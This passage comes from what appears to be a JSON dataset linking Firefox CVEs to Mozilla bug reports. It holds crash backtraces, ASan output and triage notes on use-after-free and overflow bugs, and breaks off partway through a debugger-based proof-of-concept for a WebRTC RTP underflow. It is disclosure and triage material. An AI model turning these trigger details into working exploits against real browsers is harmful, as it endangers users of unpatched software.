../../dist/include/js/Value.h:1841 #1 0x00000000006e78f0 in DoMarking<JS::Value> (val=..., gcmarker=0x7ffff693e040) at js/src/gc/Marking.cpp:759 #2 DispatchToTracer<JS::Value> (trc=<optimized out>, thingp=0x7fffffffc890, name=<optimized out>) at js/src/gc/Marking.cpp:610 #3 0x00000000006e7b65 in js::TraceRootRange<JS::Value> (trc=trc@entry=0x7ffff693e040, len=4, vec=<optimized out>, name=0xba15cc \"fp argv\") at js/src/gc/Marking.cpp:497 #4 0x00000000006126ad in js::InterpreterFrame::markValues (this=this@entry=0x7ffff47ea0c8, trc=trc@entry=0x7ffff693e040, sp=<optimized out>, pc=<optimized out>) at js/src/vm/Stack.cpp:391 #5 0x000000000061622c in MarkInterpreterActivation (act=0x7fffffffc2d0, trc=0x7ffff693e040) at js/src/vm/Stack.cpp:400 #6 js::MarkInterpreterActivations (rt=<optimized out>, trc=trc@entry=0x7ffff693e040) at js/src/vm/Stack.cpp:411 #7 0x00000000006d18b3 in js::gc::GCRuntime::markRuntime (this=this@entry=0x7ffff693c3f0, trc=trc@entry=0x7ffff693e040, traceOrMark=traceOrMark@entry=js::gc::GCRuntime::MarkRuntime) at js/src/gc/RootMarking.cpp:314 #8 0x000000000090ee7f in js::gc::GCRuntime::beginMarkPhase (this=this@entry=0x7ffff693c3f0, reason=reason@entry=JS::gcreason::DEBUG_GC) at js/src/jsgc.cpp:3951 #9 0x00000000009345f1 in js::gc::GCRuntime::incrementalCollectSlice (this=this@entry=0x7ffff693c3f0, budget=..., reason=reason@entry=JS::gcreason::DEBUG_GC) at js/src/jsgc.cpp:5892 #10 0x000000000093529d in js::gc::GCRuntime::gcCycle (this=this@entry=0x7ffff693c3f0, nonincrementalByAPI=nonincrementalByAPI@entry=true, budget=..., reason=reason@entry=JS::gcreason::DEBUG_GC) at js/src/jsgc.cpp:6166 #11 0x000000000093561c in js::gc::GCRuntime::collect (this=this@entry=0x7ffff693c3f0, nonincrementalByAPI=nonincrementalByAPI@entry=true, budget=..., reason=reason@entry=JS::gcreason::DEBUG_GC) at js/src/jsgc.cpp:6282 #12 0x0000000000935991 in js::gc::GCRuntime::gc (this=0x7ffff693c3f0, gckind=<optimized out>, reason=JS::gcreason::DEBUG_GC) at js/src/jsgc.cpp:6346 #13 0x000000000093708d in js::gc::GCRuntime::runDebugGC (this=this@entry=0x7ffff693c3f0) at js/src/jsgc.cpp:6785 #14 0x00000000005378ef in js::gc::GCRuntime::gcIfNeededPerAllocation (this=this@entry=0x7ffff693c3f0, cx=cx@entry=0x7ffff6907000) at js/src/gc/Allocator.cpp:28 #15 0x0000000000565470 in checkAllocatorState<(js::AllowGC)1> (kind=js::gc::FIRST, cx=0x7ffff6907000, this=0x7ffff693c3f0) at js/src/gc/Allocator.cpp:55 #16 js::Allocate<JSObject, (js::AllowGC)1> (cx=cx@entry=0x7ffff6907000, kind=kind@entry=js::gc::FIRST, nDynamicSlots=0, heap=heap@entry=js::gc::DefaultHeap, clasp=clasp@entry=0x17fc0e0 <JSFunction::class_>) at js/src/gc/Allocator.cpp:121 #17 0x00000000005a5ae7 in JSObject::create (cx=0x7ffff6907000, kind=js::gc::FIRST, heap=js::gc::DefaultHeap, shape=..., group=...) at js/src/jsobjinlines.h:329 #18 0x00000000009057c6 in NewObject (cx=cx@entry=0x7ffff6907000, group=group@entry=..., kind=kind@entry=js::gc::FIRST, newKind=newKind@entry=js::GenericObject, initialShapeFlags=initialShapeFlags@entry=0) at js/src/jsobj.cpp:684 #19 0x0000000000906b85 in js::NewObjectWithClassProtoCommon (cxArg=cxArg@entry=0x7ffff6907000, clasp=clasp@entry=0x17fc0e0 <JSFunction::class_>, protoArg=protoArg@entry=..., allocKind=allocKind@entry=js::gc::FIRST, newKind=js::GenericObject) at js/src/jsobj.cpp:812 #20 0x000000000093107d in NewObjectWithClassProto (newKind=<optimized out>, allocKind=js::gc::FIRST, proto=..., clasp=0x17fc0e0 <JSFunction::class_>, cx=0x7ffff6907000) at js/src/jsobjinlines.h:721 #21 NewFunctionClone (proto=..., allocKind=js::gc::FIRST, newKind=(unknown: 4294949072), fun=..., cx=0x7ffff6907000) at js/src/jsfun.cpp:2080 #22 js::CloneFunctionReuseScript (cx=cx@entry=0x7ffff6907000, fun=..., fun@entry=..., parent=parent@entry=..., allocKind=allocKind@entry=js::gc::FIRST, newKind=newKind@entry=js::GenericObject, proto=..., proto@entry=...) at js/src/jsfun.cpp:2115 #23 0x00000000005fe857 in js::CloneFunctionObjectIfNotSingleton (cx=0x7ffff6907000, fun=..., parent=..., proto=proto@entry=..., newKind=newKind@entry=js::GenericObject) at js/src/jsfuninlines.h:90 #24 0x00000000005d73b3 in js::Lambda (cx=<optimized out>, fun=..., parent=...) at js/src/vm/Interpreter.cpp:4278 #25 0x00000000005db9b9 in Interpret (cx=0x7ffff6907000, state=...) at js/src/vm/Interpreter.cpp:3524 #26 0x00000000005e64bd in js::RunScript (cx=cx@entry=0x7ffff6907000, state=...) at js/src/vm/Interpreter.cpp:706 #27 0x00000000005e6d91 in js::Invoke (cx=cx@entry=0x7ffff6907000, args=..., construct=<optimized out>) at js/src/vm/Interpreter.cpp:783 #28 0x00000000005081ea in HandleDynamicLinkFailure (name=..., module=..., args=..., cx=0x7ffff6907000) at js/src/asmjs/AsmJSLink.cpp:886 #29 LinkAsmJS (cx=0x7ffff6907000, argc=<optimized out>, vp=<optimized out>) at js/src/asmjs/AsmJSLink.cpp:1053 #30 0x00007ffff7ff3c9c in ?? () #31 0x00007fffffffc918 in ?? () #32 0x00007fffffffc850 in ?? () #33 0x0000000000000000 in ?? () rax 0x4949494949494949 5280832617179597129 rbx 0x7ffff7e7d380 140737352553344 rcx 0xfa70 64112 rdx 0x7ffff6974730 140737330497328 rsi 0x1000000000000 281474976710656 rdi 0x0 0 rbp 0x7ffff693e040 140737330274368 rsp 0x7fffffffb060 140737488334944 r8 0x1 1 r9 0x0 0 r10 0x56029e99 1443012249 r11 0x7 7 r12 0x7ffff693e040 140737330274368 r13 0xfffb800000000000 -1266637395197952 r14 0x4 4 r15 0xfffa7fffffffffff -1548112371908609 rip 0x6ddb10 <js::DispatchValueTyped<DoMarkingFunctor<JS::Value>, js::GCMarker*&>(DoMarkingFunctor<JS::Value>, JS::Value const&, (decltype ({parm#1}((JSObject*)((decltype(nullptr))0), (Forward<js::GCMarker*&>)({parm#3})))&&)...)+176> => 0x6ddb10 <js::DispatchValueTyped<DoMarkingFunctor<JS::Value>, js::GCMarker*&>(DoMarkingFunctor<JS::Value>, JS::Value const&, (decltype ({parm#1}((JSObject*)((decltype(nullptr))0), (Forward<js::GCMarker*&>)({parm#3})))&&)...)+176>: mov 0x10(%rax),%rax 0x6ddb14 <js::DispatchValueTyped<DoMarkingFunctor<JS::Value>, js::GCMarker*&>(DoMarkingFunctor<JS::Value>, JS::Value const&, (decltype ({parm#1}((JSObject*)((decltype(nullptr))0), (Forward<js::GCMarker*&>)({parm#3})))&&)...)+180>: movb $0x1,0x291(%rax) Assuming sec-critical because of the crash pattern in register rax and GC being involved. Likely use-after-free."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1219330",
        "title": "crash in mozilla::layers::TextureClient::CreateForYCbCr with a 0xffffffffe5e5e609 address",
        "description": "[Tracking Requested - why for this release]: [Tracking Requested - why for this release]: This bug was filed from the Socorro interface and is report bp-3d56b4aa-6787-47bf-8585-6b15a2151028. ============================================================= Stack Trace: 0 xul.dll mozilla::layers::TextureClient::CreateForYCbCr(mozilla::layers::ISurfaceAllocator*, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::StereoMode, mozilla::layers::TextureFlags) gfx/layers/client/TextureClient.cpp 1 xul.dll mozilla::layers::SharedPlanarYCbCrImage::Allocate(mozilla::layers::PlanarYCbCrData&) gfx/layers/ipc/SharedPlanarYCbCrImage.cpp 2 xul.dll mozilla::layers::SharedPlanarYCbCrImage::SetData(mozilla::layers::PlanarYCbCrData const&) gfx/layers/ipc/SharedPlanarYCbCrImage.cpp 3 xul.dll mozilla::VideoData::Create(mozilla::VideoInfo const&, mozilla::layers::ImageContainer*, mozilla::layers::Image*, __int64, __int64, __int64, mozilla::VideoData::YCbCrBuffer const&, bool, __int64, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) dom/media/MediaData.cpp 4 @0x20c0f83f It looks like all those stacks are cut off with a hex address at that point. Crashes with this signature have been present in 42 betas and newer nightly/dev-edition builds with low frequency, but in early 42 RC data, this is the #3 signature with ~2.2% of the overall data. The address is always 0xffffffffe5e5e609, which points to the e5e5... pattern that is now our memory poison and the eax register is the exact poison \"0xe5e5e5e5\" so this smells like a UAF and I'm marking this as security. The signature itself does appear a single-digit amount of times in 41 but not with a poison address, so I consider 41 unaffected. The 43 and 44 cases do have the poison as well, though. It affects all versions of Windows from XP to 10, and 32bit as well as 64bit builds, in the latter case the rax register is the poison \"0xe5e5e5e5e5e5e5e5\" (while the address is [mis]reported as 0xffffffffffffffff). Milan, is this something that looks like a graphics or like a media bug? We should take a look today to find out if this is something we need to get fixed for the 42 release (we are in RC already) or not."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1208059",
        "title": "crash in mozilla::plugins::PluginAsyncSurrogate::Cast on 42 beta, often with 0xffffffffe5e5e5e5 address",
        "description": "[Tracking Requested - why for this release]: This bug was filed from the Socorro interface and is report bp-5397eb78-fe15-4051-b8c9-129862150924. ============================================================= Top Stack Frames: 0 xul.dll mozilla::plugins::PluginAsyncSurrogate::Cast(_NPP*) dom/plugins/ipc/PluginAsyncSurrogate.cpp 1 xul.dll mozilla::plugins::PluginInstanceParent::PluginInstanceParent(mozilla::plugins::PluginModuleParent*, _NPP*, nsCString const&, _NPNetscapeFuncs const*) dom/plugins/ipc/PluginInstanceParent.cpp 2 xul.dll mozilla::plugins::PluginModuleParent::NPP_NewInternal(char*, _NPP*, unsigned short, nsTArray<nsCString>&, nsTArray<nsCString>&, _NPSavedData*, short*) dom/plugins/ipc/PluginModuleParent.cpp 3 xul.dll mozilla::plugins::PluginModuleParent::InitAsyncSurrogates() dom/plugins/ipc/PluginModuleParent.cpp 4 xul.dll mozilla::plugins::PluginModuleParent::RecvNP_InitializeResult(short const&) dom/plugins/ipc/PluginModuleParent.cpp 5 xul.dll mozilla::plugins::PluginModuleChromeParent::RecvNP_InitializeResult(short const&) dom/plugins/ipc/PluginModuleParent.cpp 6 xul.dll mozilla::plugins::PPluginModuleParent::OnMessageReceived(IPC::Message const&) obj-firefox/ipc/ipdl/PPluginModuleParent.cpp 7 xul.dll mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) ipc/glue/MessageChannel.cpp 8 xul.dll mozilla::ipc::MessageChannel::DispatchMessageW(IPC::Message const&) ipc/glue/MessageChannel.cpp 9 xul.dll mozilla::ipc::MessageChannel::OnMaybeDequeueOne() ipc/glue/MessageChannel.cpp 10 xul.dll MessageLoop::DoWork() ipc/chromium/src/base/message_loop.cc [...] This is the #5 crash signature with 2% of all crashes in early 42.0 Beta 1 data. A lot of those crashes have a 0xffffffffe5e5e5e5 address (how do we get 64bit addresses on 32bit builds?) and as the lower 32bit of that match our (new) poison-on-free value, that smells like UAF and I'm cautiously marking it security for the moment. Aaron, this sounds like Async Plugin Init would be involved, can you take a look?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1193999",
        "title": "Crash [@ graphite2::TtfUtil::CheckTable]",
        "description": "The attached testcase crashes on graphite2 revision fa8d4398dded (run through the gr2fonttest command line utility). Backtrace: ==1667==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000efd0 at pc 0x7fe96c758c78 bp 0x7fff75154680 sp 0x7fff75154678 READ of size 4 at 0x60200000efd0 thread T0 #0 0x7fe96c758c77 in graphite2::TtfUtil::CheckTable(graphite2::TtfUtil::Tag, void const*, unsigned long) /src/TtfUtil.cpp:273:18 #1 0x7fe96c6d281c in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:277 #2 0x7fe96c6ea5b3 in graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) /src/GlyphCache.cpp:248 #3 0x7fe96c6e1211 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:123 #4 0x7fe96c6ce304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 #5 0x7fe96c66ba7b in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) /src/gr_face.cpp:54 #6 0x7fe96c66ef79 in gr_make_face_with_ops /src/gr_face.cpp:89 #7 0x7fe96c66ef79 in gr_make_file_face /src/gr_face.cpp:242 #8 0x48ed05 in Parameters::testFileFont() const /gr2fonttest/gr2FontTest.cpp:618 #9 0x49248b in main /gr2fonttest/gr2FontTest.cpp:770 #10 0x7fe96c2acec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #11 0x486c4c in _start (/build/gr2fonttest/gr2fonttest+0x486c4c) 0x60200000efd1 is located 0 bytes to the right of 1-byte region [0x60200000efd0,0x60200000efd1) allocated by thread T0 here: #0 0x46df61 in __interceptor_malloc (/build/gr2fonttest/gr2fonttest+0x46df61) #1 0x7fe96c760bfe in graphite2::FileFace::get_table_fn(void const*, unsigned int, unsigned long*) /src/FileFace.cpp:90 #2 0x7fe96c6d279f in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:274 #3 0x7fe96c6ea5b3 in graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) /src/GlyphCache.cpp:248 #4 0x7fe96c6e1211 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:123 #5 0x7fe96c6ce304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 SUMMARY: AddressSanitizer: heap-buffer-overflow /src/TtfUtil.cpp:273 graphite2::TtfUtil::CheckTable(graphite2::TtfUtil::Tag, void const*, unsigned long) Shadow bytes around the buggy address: 0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9dc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9dd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9df0: fa fa fa fa fa fa fa fa fa fa[01]fa fa fa 00 04 0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==1667==ABORTING Note that this is on graphite2 trunk and without OTS in front of it. We tested this particular file and Firefox and it is rejected by OTS with: Sill: invalid table offset However, according to cdiehl that doesn't necessarily mean that the bug cannot be reached through OTS (e.g. by fixing up the testcase enough to make it through). Marking s-s until we confirmed that this bug cannot be reached/exploited with OTS enabled."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1200580",
        "title": "Crash in mozilla::DisplayItemClip::IntersectWith",
        "description": "When running a certain Gaia Integration tests with Mulet on an optimized build (debug and prod), we are getting the crash from below. To run the test, download latest Mulet and run the following command: RUNTIME=/PATH/TO/MULET/firefox TEST_FILES=/PATH/TO/gaia/apps/system/test/marionette/pinning_the_web_test.js make test-integration This crashes about 50% of the time on my Mac Pro. It is also crashing on Linux in c-i: https://treeherder.mozilla.org/logviewer.html#?job_id=2634427&repo=b2g-inbound * thread #1: tid = 0x3e4fa, 0x00000001043db9c9 XUL`mozilla::DisplayItemClip::IntersectWith(mozilla::DisplayItemClip const&) + 409, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT) * frame #0: 0x00000001043db9c9 XUL`mozilla::DisplayItemClip::IntersectWith(mozilla::DisplayItemClip const&) + 409 frame #1: 0x00000001043e6e37 XUL`mozilla::ContainerState::ProcessDisplayItems(nsDisplayList*) + 903 frame #2: 0x00000001043edd35 XUL`mozilla::FrameLayerBuilder::BuildContainerLayerFor(nsDisplayListBuilder*, mozilla::layers::LayerManager*, nsIFrame*, nsDisplayItem*, nsDisplayList*, mozilla::ContainerLayerParameters const&, mozilla::gfx::Matrix4x4 const*, unsigned int) + 8533 frame #3: 0x000000010444b177 XUL`nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) + 999 frame #4: 0x000000010447ca2c XUL`nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) + 4780 frame #5: 0x000000010449c346 XUL`PresShell::RenderDocument(nsRect const&, unsigned int, unsigned int, gfxContext*) + 1414 frame #6: 0x0000000103a4393e XUL`mozilla::dom::CanvasRenderingContext2D::DrawWindow(nsGlobalWindow&, double, double, double, double, nsAString_internal const&, unsigned int, mozilla::ErrorResult&) + 1374 frame #7: 0x0000000103644fad XUL`mozilla::dom::CanvasRenderingContext2DBinding::drawWindow(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) + 1293 frame #8: 0x0000000103a06eb1 XUL`mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) + 401 frame #9: 0x000000010547ef9c XUL`js::Invoke(JSContext*, JS::CallArgs const&, js::MaybeConstruct) + 444 frame #10: 0x000000010549082d XUL`Interpret(JSContext*, js::RunState&) + 35629 frame #11: 0x0000000105487cbd XUL`js::RunScript(JSContext*, js::RunState&) + 381 frame #12: 0x000000010547f3c5 XUL`js::Invoke(JSContext*, JS::CallArgs const&, js::MaybeConstruct) + 1509 frame #13: 0x0000000105468042 XUL`js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) + 610 frame #14: 0x00000001057f1fef XUL`JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) + 111 frame #15: 0x0000000102c365b2 XUL`nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) + 5250 frame #16: 0x000000010246c230 XUL`PrepareAndDispatch + 576 frame #17: 0x000000010246b07b XUL`SharedStub + 91 frame #18: 0x000000010241340a XUL`(anonymous namespace)::MessageLoopIdleTask::Run() + 58 frame #19: 0x00000001024134a7 XUL`(anonymous namespace)::MessageLoopTimerCallback::Notify(nsITimer*) + 23 frame #20: 0x0000000102467322 XUL`nsTimerImpl::Fire() + 994 frame #21: 0x000000010245af47 XUL`nsTimerEvent::Run() + 215 frame #22: 0x000000010245ee11 XUL`nsThread::ProcessNextEvent(bool, bool*) + 1041 frame #23: 0x0000000102488301 XUL`NS_ProcessPendingEvents(nsIThread*, unsigned int) + 81 frame #24: 0x000000010419d874 XUL`nsBaseAppShell::NativeEventCallback() + 116 frame #25: 0x00000001041f7509 XUL`nsAppShell::ProcessGeckoEvents(void*) + 297 frame #26: 0x00007fff8cc6ca01 CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 17 frame #27: 0x00007fff8cc5eb8d CoreFoundation`__CFRunLoopDoSources0 + 269 frame #28: 0x00007fff8cc5e1bf CoreFoundation`__CFRunLoopRun + 927 frame #29: 0x00007fff8cc5dbd8 CoreFoundation`CFRunLoopRunSpecific + 296 frame #30: 0x00007fff8f3a356f HIToolbox`RunCurrentEventLoopInMode + 235 frame #31: 0x00007fff8f3a32ea HIToolbox`ReceiveNextEventCommon + 431 frame #32: 0x00007fff8f3a312b HIToolbox`_BlockUntilNextEventMatchingListInModeWithFilter + 71 frame #33: 0x00007fff947de8ab AppKit`_DPSNextEvent + 978 frame #34: 0x00007fff947dde58 AppKit`-[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 346 frame #35: 0x00000001041f6ae6 XUL`-[GeckoNSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 86 frame #36: 0x00007fff947d3af3 AppKit`-[NSApplication run] + 594 frame #37: 0x00000001041f7c8c XUL`nsAppShell::Run() + 236 frame #38: 0x0000000104ade349 XUL`nsAppStartup::Run() + 41 frame #39: 0x0000000104b3748d XUL`XREMain::XRE_mainRun() + 3325 frame #40: 0x0000000104b37835 XUL`XREMain::XRE_main(int, char**, nsXREAppData const*) + 645 frame #41: 0x0000000104b37c43 XUL`XRE_main + 227 frame #42: 0x0000000100001bfd firefox`main + 1773 frame #43: 0x00000001000011b4 firefox`start + 52"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1197012",
        "title": "crash in nsAString_internal::Assign(nsAString_internal const&, mozilla::fallible_t const&) | nsAString_internal::Assign(nsAString_internal const&) | mozilla::ErrorResult::ThrowErrorWithMessage(__va_list_tag*, mozilla::dom::ErrNum, nsresult)",
        "description": "This bug was filed from the Socorro interface and is report bp-123cedd1-aed8-4e77-86b9-9bfc82150820. ============================================================= Fresh profile, opened https://johnme-gcm.appspot.com/chat/ - Signed in - Closed tab - Received a push notification - Opened tab - Refresh - Waited - Un-focus the window to do something else - Crash"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1194006",
        "title": "Crash [@ unsigned long be::_peek]",
        "description": "The attached testcase crashes on graphite2 revision fa8d4398dded (run through the gr2fonttest command line utility). Backtrace: ==19692==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000efd1 at pc 0x7fcc28c97e82 bp 0x7fff0c7d2af0 sp 0x7fff0c7d2ae8 READ of size 1 at 0x60200000efd1 thread T0 #0 0x7fcc28c97e81 in unsigned long be::_peek<1>(unsigned char const*) /src/inc/Endian.h:77 #1 0x7fcc28c97e81 in unsigned long be::_peek<2>(unsigned char const*) /src/inc/Endian.h:50 #2 0x7fcc28c97e81 in unsigned long be::_peek<4>(unsigned char const*) /src/inc/Endian.h:50 #3 0x7fcc28c97e81 in unsigned int be::peek<unsigned int>(void const*) /src/inc/Endian.h:55 #4 0x7fcc28c97e81 in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:284 #5 0x7fcc28caf5df in graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) /src/GlyphCache.cpp:248 #6 0x7fcc28ca6211 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:123 #7 0x7fcc28c93304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 #8 0x7fcc28c30a7b in (anonymous namespace)::load_face(graphite2::Face&, unsigned int) /src/gr_face.cpp:54 #9 0x7fcc28c33f79 in gr_make_face_with_ops /src/gr_face.cpp:89 #10 0x7fcc28c33f79 in gr_make_file_face /src/gr_face.cpp:242 #11 0x48ed05 in Parameters::testFileFont() const /gr2fonttest/gr2FontTest.cpp:618 #12 0x49248b in main /gr2fonttest/gr2FontTest.cpp:770 #13 0x7fcc28871ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4) #14 0x486c4c in _start (/build/gr2fonttest/gr2fonttest+0x486c4c) 0x60200000efd1 is located 0 bytes to the right of 1-byte region [0x60200000efd0,0x60200000efd1) allocated by thread T0 here: #0 0x46df61 in __interceptor_malloc (/build/gr2fonttest/gr2fonttest+0x46df61) #1 0x7fcc28d25bfe in graphite2::FileFace::get_table_fn(void const*, unsigned int, unsigned long*) /src/FileFace.cpp:90 #2 0x7fcc28c9779f in graphite2::Face::Table::Table(graphite2::Face const&, graphite2::TtfUtil::Tag, unsigned int) /src/Face.cpp:274 #3 0x7fcc28caf5df in graphite2::GlyphCache::Loader::Loader(graphite2::Face const&, bool) /src/GlyphCache.cpp:248 #4 0x7fcc28ca6211 in graphite2::GlyphCache::GlyphCache(graphite2::Face const&, unsigned int) /src/GlyphCache.cpp:123 #5 0x7fcc28c93304 in graphite2::Face::readGlyphs(unsigned int) /src/Face.cpp:98 SUMMARY: AddressSanitizer: heap-buffer-overflow /src/inc/Endian.h:77 unsigned long be::_peek<1>(unsigned char const*) Shadow bytes around the buggy address: 0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9dc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9dd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9df0: fa fa fa fa fa fa fa fa fa fa[01]fa fa fa 00 04 0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==19692==ABORTING Note that this is on graphite2 trunk and without OTS in front of it. We tested this particular file in Firefox and it is rejected by OTS with: glyf: invalid table offset However, according to cdiehl that doesn't necessarily mean that the bug cannot be reached through OTS (e.g. by fixing up the testcase enough to make it through). Marking s-s until we confirmed that this bug cannot be reached/exploited with OTS enabled."
      }
    ],
    "CVE-2015-7203": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1201183",
        "title": "Buffer overflow on OOM in DirectWriteFontInfo::LoadFontFamilyData",
        "description": "In bug 968520 q1@lastland.net posted: (In reply to q1 from comment #137) > There is now an array-overrun bug in DirectWriteFontInfo::LoadFontFamilyData > (gfx/thebes/gfxDWriteFontList.cpp): > > // lookup the family > nsAutoTArray<wchar_t, 32> famName; > > uint32_t len = aFamilyName.Length(); > - famName.SetLength(len + 1); > + famName.SetLength(len + 1, fallible); > memcpy(famName.Elements(), aFamilyName.BeginReading(), len * > sizeof(char16_t)); > famName[len] = 0; > > SetLength used to be infallible, but the code now uses the fallible version > without a status check. So on OOM the memcpy will overwrite some amount of > unowned memory. Since this is Aurora (?) code, I've filed the bug here > rather than in a separate report. Thanks for the bug report, but please file security issues as security bugs that affect code we're shipping on any channel, including Nightly and Aurora."
      }
    ],
    "CVE-2015-7205": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1220493",
        "title": "Underflow in RTPReceiverVideo::ParseRtpPacket causes memory-safety bug and information leak",
        "description": "RTPReceiverVideo::ParseRtpPacket (media\\webrtc\\trunk\\webrtc\\modules\\rtp_rtcp\\source\\rtp_receiver_video.cc) will underflow if an incoming packet is malformed such that its padding length is greater than its payload length. This underflow then causes ParseRtpPacket to pass to its callback function (which eventualy passes it to a video decoder) a buffer length that exceeds the buffer's actual length. The receiver's decoder then reads that buffer and displays the contents as video (which usually, but not always, appears as trash). If the receiver happens to be sharing the tab containing the decoded video with another user via Firefox Hello, the other user will receive the video, thus leaking private information to the other user. The bug is still present in the current trunk: http://hg.mozilla.org/mozilla-central/file/96377bdbcdf3/media/webrtc/trunk/webrtc/modules/rtp_rtcp/source/rtp_receiver_video.cc ; http://hg.mozilla.org/mozilla-central/file/96377bdbcdf3/media/webrtc/trunk/webrtc/modules/rtp_rtcp/source/rtp_utility.cc . Details ------- The bug is in RTPReceiverVideo::ParseRtpPacket lines 72-3, which don't check for underflow: 72: const uint16_t payload_data_length = 73: payload_length - rtp_header->header.paddingLength; Equivalently, the bug could be considered to be in RtpHeaderParser::Parse (media\\webrtc\\trunk\\webrtc\\modules\\rtp_rtcp\\source\\rtp_utility.cc), which doesn't verify that the padding fits within the packet, or even in RtpDepacketizer::Parse and its overriding functions (ditto). (BTW, there is also a similar underflow in RtpReceiverImpl::IncomingRtpPacket line 201, but it appears to be harmless because the result appears to be used only for statistics). A (rather involved) debugger-based proof-of-concept goes like this: 1. Start FF 41.0 x86 debug build with -profilemanager -no-remote. Call this session the \"sender\". Create a new profile (\"sender profile\"), run FF with it, and attach a debugger to it. 2. Patch the sender's code in RTPSender::CreateRTPHeader (media\\webrtc\\trunk\\webrtc\\modules\\rtp_rtcp\\source\\rtp_sender.cc) line 1103 to initialize |header [0]| to 0xa0 instead of 0x80 (this sets the P (\"padding\") bit in the header, which causes RtpHeaderParser::Parse to interpret the last byte of the packet as a count of padding 